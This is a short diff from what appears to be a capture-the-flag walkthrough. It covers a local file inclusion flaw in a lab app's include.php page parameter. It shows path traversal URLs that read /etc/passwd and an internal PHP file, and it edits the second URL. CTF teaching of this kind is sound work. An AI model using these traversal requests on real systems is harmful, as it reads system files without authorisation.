@@ -60,7 +60,8 @@ The file /include.php has a vulnerable page parameter.
 http://<ip>/token_trails/include.php?page=../../../../etc/passwd
 Check internal PHP files:
 
-http://<ip>/token_trails/include.php?page=../../../../var/www/html/token_trails/secret.php
+http://<ip>/token_trails/include.php?page=../../../../var/www/html/token_trails/
+
 You’ll find the next flag there.
 
 ✅ Flag:
